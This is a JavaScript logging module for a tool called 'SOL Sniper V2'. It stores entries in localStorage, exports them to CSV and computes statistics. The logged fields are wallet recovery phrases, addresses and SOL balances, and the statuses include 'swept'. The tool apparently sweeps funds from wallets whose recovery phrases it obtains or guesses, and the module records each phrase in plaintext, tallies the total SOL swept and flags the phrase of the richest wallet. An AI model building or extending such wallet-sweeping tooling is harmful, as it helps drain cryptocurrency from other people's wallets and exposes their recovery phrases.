/**
 * Transaction Logger for SOL Sniper V2
 * Handles storing and retrieving transaction logs
 */

const TX_LOG_KEY = "sweep_logs"
const MAX_LOGS = 10000 // Maximum number of logs to store

/**
 * Save a transaction log entry
 * @param {Object} logEntry - Transaction log entry
 */
export function addLogEntry(logEntry) {
  try {
    // Ensure required fields
    const entry = {
      timestamp: Date.now(),
      ...logEntry,
    }

    // Get existing logs
    const logs = getLogs()

    // Add new entry at the beginning
    logs.unshift(entry)

    // Limit the number of logs
    const trimmedLogs = logs.slice(0, MAX_LOGS)

    // Save back to localStorage
    localStorage.setItem(TX_LOG_KEY, JSON.stringify(trimmedLogs))

    return true
  } catch (error) {
    console.error("Error saving log entry:", error)
    return false
  }
}

/**
 * Get all transaction logs
 * @returns {Array} Array of log entries
 */
export function getLogs() {
  try {
    if (typeof window === "undefined") {
      return []
    }
    return JSON.parse(localStorage.getItem(TX_LOG_KEY) || "[]")
  } catch (error) {
    console.error("Error retrieving logs:", error)
    return []
  }
}

/**
 * Clear all transaction logs
 */
export function clearLogs() {
  if (typeof window === "undefined") return
  localStorage.setItem(TX_LOG_KEY, "[]")
}

/**
 * Export logs to CSV format
 * @param {Array} logs - Log entries to export (defaults to all logs)
 * @returns {string} CSV string
 */
export function exportLogsAsCSV(logs = null) {
  const dataToExport = logs || getLogs()
  if (!dataToExport || dataToExport.length === 0) return ""

  const headers = ["Timestamp", "Phrase", "Address", "Balance (SOL)", "Status", "Transaction", "Explorer Link"]
  const csvRows = [
    headers.join(","),
    ...dataToExport.map((log) =>
      [
        new Date(log.timestamp || Date.now()).toISOString(),
        `"${log.phrase || ""}"`,
        log.address || "",
        log.balance || 0,
        log.status || "",
        log.tx || "",
        log.explorer || "",
      ].join(","),
    ),
  ]

  return csvRows.join("\n")
}

/**
 * Get statistics about transaction logs
 * @returns {Object} Statistics object
 */
export function getLogStats() {
  const logs = getLogs()

  const stats = {
    totalLogs: logs.length,
    sweptCount: 0,
    noFundsCount: 0,
    errorCount: 0,
    totalSolSwept: 0,
    avgSolPerWallet: 0,
    highestBalance: 0,
    highestBalancePhrase: "",
    recentActivity: [],
  }

  logs.forEach((log) => {
    if (log.status === "swept") {
      stats.sweptCount++
      stats.totalSolSwept += Number(log.balance) || 0

      if ((Number(log.balance) || 0) > stats.highestBalance) {
        stats.highestBalance = Number(log.balance) || 0
        stats.highestBalancePhrase = log.phrase || ""
      }
    } else if (log.status === "no_funds") {
      stats.noFundsCount++
    } else {
      stats.errorCount++
    }
  })

  stats.avgSolPerWallet = stats.sweptCount > 0 ? stats.totalSolSwept / stats.sweptCount : 0
  stats.recentActivity = logs.slice(0, 5)

  return stats
}
